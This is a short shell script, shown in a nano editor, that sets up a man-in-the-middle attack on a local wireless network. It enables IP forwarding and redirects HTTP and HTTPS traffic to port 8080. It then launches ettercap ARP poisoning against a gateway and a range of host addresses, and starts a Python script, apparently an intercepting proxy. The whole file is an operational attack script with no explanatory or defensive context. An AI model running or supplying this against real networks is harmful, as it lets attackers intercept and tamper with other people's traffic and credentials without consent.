GNU nano 3.1                                                                       run.sh                                                                                  

#!/bin/sh

sysctl -w net.ipv4.ip_forward=1

nohup iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 &
nohup iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080 &

nohup ettercap -TqP autoadd -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150// &

nohup python3 general.py &
